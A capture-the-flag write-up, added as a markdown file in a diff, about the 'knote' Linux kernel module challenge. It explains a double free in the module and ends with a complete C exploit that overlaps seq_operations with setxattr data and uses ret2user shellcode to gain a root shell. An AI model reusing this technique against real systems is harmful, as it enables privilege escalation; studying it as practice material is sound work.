@@ -1,0 +1,327 @@
+# knote
+
+## Disclaimer
+
+I only solved locally since the challenge got retired just after it was released and I stopped paying for VIP since I was barely using it. If you solved that challenge remotely and anything from this article works differently in the remote instance please let me know.
+
+## Files
+
+{% embed url="<https://github.com/0xTen/CTFs/tree/main/htb/challenges/knote>" %}
+
+## The module
+
+```c
+[...]
+static long knote_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
+    mutex_lock(&knote_ioctl_lock);
+    struct knote_user ku;
+    if(copy_from_user(&ku, (void *)arg, sizeof(struct knote_user)))
+        return -EFAULT;
+    switch(cmd) {
+        case KNOTE_CREATE:
+            if(ku.len > 0x20 || ku.idx >= 10)
+                return -EINVAL;
+            char *data = kmalloc(ku.len, GFP_KERNEL);
+            knotes[ku.idx] = kmalloc(sizeof(struct knote), GFP_KERNEL);
+            if(data == NULL || knotes[ku.idx] == NULL) {
+                mutex_unlock(&knote_ioctl_lock);
+                return -ENOMEM;
+            }
+
+            knotes[ku.idx]->data = data;
+            knotes[ku.idx]->len = ku.len;
+            if(copy_from_user(knotes[ku.idx]->data, ku.data, ku.len)) {
+                kfree(knotes[ku.idx]->data);
+                kfree(knotes[ku.idx]);
+                mutex_unlock(&knote_ioctl_lock);
+                return -EFAULT;
+            }
+            knotes[ku.idx]->encrypt_func = knote_encrypt;
+            knotes[ku.idx]->decrypt_func = knote_decrypt;
+            break;
+        case KNOTE_DELETE:
+            if(ku.idx >= 10 || !knotes[ku.idx]) {
+                mutex_unlock(&knote_ioctl_lock);
+                return -EINVAL;
+            }
+            kfree(knotes[ku.idx]->data);
+            kfree(knotes[ku.idx]);
+            knotes[ku.idx] = NULL;
+            break;
+        case KNOTE_READ:
+            if(ku.idx >= 10 || !knotes[ku.idx] || ku.len > knotes[ku.idx]->len) {
+                mutex_unlock(&knote_ioctl_lock);
+                return -EINVAL;
+            }
+            if(copy_to_user(ku.data, knotes[ku.idx]->data, ku.len)) {
+                mutex_unlock(&knote_ioctl_lock);
+                return -EFAULT;
+            }
+            break;
+        case KNOTE_ENCRYPT:
+            if(ku.idx >= 10 || !knotes[ku.idx]) {
+                mutex_unlock(&knote_ioctl_lock);
+                return -EINVAL;
+            }
+            knotes[ku.idx]->encrypt_func(knotes[ku.idx]->data, knotes[ku.idx]->len);
+            break;
+         case KNOTE_DECRYPT:
+            if(ku.idx >= 10 || !knotes[ku.idx]) {
+                mutex_unlock(&knote_ioctl_lock);
+                return -EINVAL;
+            }
+            knotes[ku.idx]->decrypt_func(knotes[ku.idx]->data, knotes[ku.idx]->len);
+            break;
+        default:
+            mutex_unlock(&knote_ioctl_lock);
+            return -EINVAL;
+    }
+    mutex_unlock(&knote_ioctl_lock);
+    return 0;
+}
+[...]
+```
+
+The module works in a really simple way. Userland is allowed to allocate up to 10 notes of up to `0x20` bytes. The module implements reading and deleting the chunks but it's impossible to write to them.
+
+## Double free
+
+There is a pretty bad bug in the following code:
+
+```c
+[...]
+knotes[ku.idx] = kmalloc(sizeof(struct knote), GFP_KERNEL);
+[...]
+if(copy_from_user(knotes[ku.idx]->data, ku.data, ku.len)) {
+    kfree(knotes[ku.idx]->data);
+    kfree(knotes[ku.idx]);
+```
+
+The KNOTE\_CREATE ioctl command first kmallocs a chunk for the requested note, then it tries to copy data from the userland pointer provided in the request structure.
+
+If copying this data fails, then the note just allocated is kfreed, this can easily be triggered by providing a bad pointer like `0x1337000`.
+
+The only problem with that code is that the pointer returned by kmalloc is still accessible via the knotes array, even after the chunk being freed.
+
+We aren't able to write to the free chunk since this isn't implemented but we can free the chunk again and create a self referenced free chunk and cause our next two allocations to overlap, which can be very easily leveraged using some kernel structures.
+
+## No kASLR
+
+Although the qemu-cmd script that starts the emulator enables kaslr, for some reason it is just not working and addresses are not being randomized.
+
+```bash
+#!/bin/bash
+
+timeout --foreground 35 qemu-system-x86_64 \
+  -m 128M \
+  -nographic \
+  -kernel /home/ctf/bzImage \
+  -append 'console=ttyS0 loglevel=3 oops=panic panic=1 kaslr' \
+  -monitor /dev/null \
+  -initrd /home/ctf/rootfs.img \
+  -no-kvm \
+  -cpu qemu64 \
+  -smp cores=2
+```
+
+## seq\_operations + setxattr
+
+The `0x20` slab is probably one of the easiest to leverage code execution from overlapping structures.
+
+We can overlap the `seq_operations` structure allocated when calling `open("/proc/self/stat",O_RDONLY);` with a `setxattr` allocated chunk that writes arbitrary data.
+
+`seq_operations`:
+
+```c
+struct seq_operations {
+	void * (*start) (struct seq_file *m, loff_t *pos);
+	void (*stop) (struct seq_file *m, void *v);
+	void * (*next) (struct seq_file *m, void *v, loff_t *pos);
+	int (*show) (struct seq_file *m, void *v);
+};
+```
+
+`setxattr`:
+
+```c
+setxattr(struct dentry *d, const char __user *name, const void __user *value,
+	 size_t size, int flags)
+{
+	int error;
+	void *kvalue = NULL;
+	char kname[XATTR_NAME_MAX + 1];
+
+	if (flags & ~(XATTR_CREATE|XATTR_REPLACE))
+		return -EINVAL;
+
+	error = strncpy_from_user(kname, name, sizeof(kname));
+	if (error == 0 || error == sizeof(kname))
+		error = -ERANGE;
+	if (error < 0)
+		return error;
+
+	if (size) {
+		if (size > XATTR_SIZE_MAX)
+			return -E2BIG;
+		kvalue = kmalloc(size, GFP_KERNEL | __GFP_NOWARN);
+		if (!kvalue) {
+			kvalue = vmalloc(size);
+			if (!kvalue)
+				return -ENOMEM;
+		}
+		if (copy_from_user(kvalue, value, size)) {
+			error = -EFAULT;
+			goto out;
+		}
+		if ((strcmp(kname, XATTR_NAME_POSIX_ACL_ACCESS) == 0) ||
+		    (strcmp(kname, XATTR_NAME_POSIX_ACL_DEFAULT) == 0))
+			posix_acl_fix_xattr_from_user(kvalue, size);
+	}
+
+	error = vfs_setxattr(d, kname, kvalue, size, flags);
+out:
+	kvfree(kvalue);
+
+	return error;
+}
+```
+
+As we can see, the `seq_operations` structure contains a few function pointers, being the first qword a fuction pointer that is called whenever we call read against the file descriptor returned from `open` when we allocated it. In the other hand, setxattr receives a userland provided pointer called `value` that will be written to a newly allocated chunk.
+
+Since those two allocations will overlap due to the double free, we can pretty easily control `rip` from here.
+
+## Final Exploit
+
+Since there is no SMEP, SMAP or KPTI, a simple ret2user attack should do the trick.
+
+```c
+#include <fcntl.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <sys/ioctl.h>
+#include <sys/mman.h>
+#include <sys/xattr.h>
+
+#define KNOTE_CREATE    0x1337
+#define KNOTE_DELETE    0x1338
+#define KNOTE_READ      0x1339
+#define KNOTE_ENCRYPT   0x133a
+#define KNOTE_DECRYPT   0x133b
+
+int dev, target;
+
+/* Module structs */
+typedef struct {
+    char *data;
+    size_t len;
+    void (*encrypt_func)(char *, size_t);
+    void (*decrypt_func)(char *, size_t);
+} knote;
+
+typedef struct {
+    unsigned long idx;
+    char * data;
+    size_t len;
+} knote_user;
+
+/* Backup registers */
+unsigned long bak_cs,bak_rflags,bak_ss,bak_rsp,bak_rip;
+
+void bak(){
+    __asm__(
+        ".intel_syntax noprefix;"
+        "mov bak_cs, cs;"
+        "mov bak_ss, ss;"
+        "mov bak_rsp, rsp;"
+        "pushf;"
+        "pop bak_rflags;"
+        ".att_syntax;"        
+    );
+    puts("[+]Registers backed up");
+}
+
+/* Helper functions */
+void debug(){
+    puts("[+]Halted execution");
+    getchar();
+}
+
+void open_dev(){
+    dev = open("/dev/knote",O_RDONLY);
+    puts("[+]Interacting with device");
+}
+
+void do_create(unsigned long idx, char *data, size_t len){
+    knote_user note = {
+        .idx = idx,
+        .data = data,
+        .len = len
+    };
+    ioctl(dev,KNOTE_CREATE,&note);
+}
+
+void do_delete(unsigned long idx){
+    knote_user note = {
+        .idx = idx
+    };
+    ioctl(dev,KNOTE_DELETE,&note);
+}
+
+void bin_sh(){
+    printf("[+]UID: %d\n",getuid());
+    close(target);
+    system("/bin/sh");
+}
+unsigned long bak_rip = (unsigned long)bin_sh;
+
+void shellcode(){
+    __asm__(
+        ".intel_syntax noprefix;"
+        "mov rdi, 0;"
+        "movabs rbx, 0xffffffff81053c50;"
+        "call rbx;"
+        "mov rdi, rax;"
+        "movabs rbx, 0xffffffff81053a30;"
+        "call rbx;"
+        "swapgs;"
+        "mov r15, bak_ss;"
+        "push r15;"
+        "mov r15, bak_rsp;"
+        "push r15;"
+        "mov r15, bak_rflags;"
+        "push r15;"
+        "mov r15, bak_cs;"
+        "push r15;"
+        "mov r15, bak_rip;"
+        "push r15;"
+        "iretq;"
+        ".att_syntax;"
+    );
+}
+
+/* Exploit */
+int main(){
+    char payload[0x20];
+    void *func_ptr = &shellcode;
+
+    bak();
+    open_dev();
+
+    /* Double free */
+    do_create(0, (char *)0x1337000, 0x20);
+    do_delete(0);
+
+    /* Allocate seq_operations */
+    target = open("/proc/self/stat", O_RDONLY);
+
+    /* Consume free entry */
+    open("/proc/self/stat", O_RDONLY);
+
+    /* Overlap w/ setxattr */
+    setxattr("/proc/self/stat","exploit", &func_ptr, 0x20, 0);
+    read(target, payload, 1);
+
+    return 0;
+}
+```
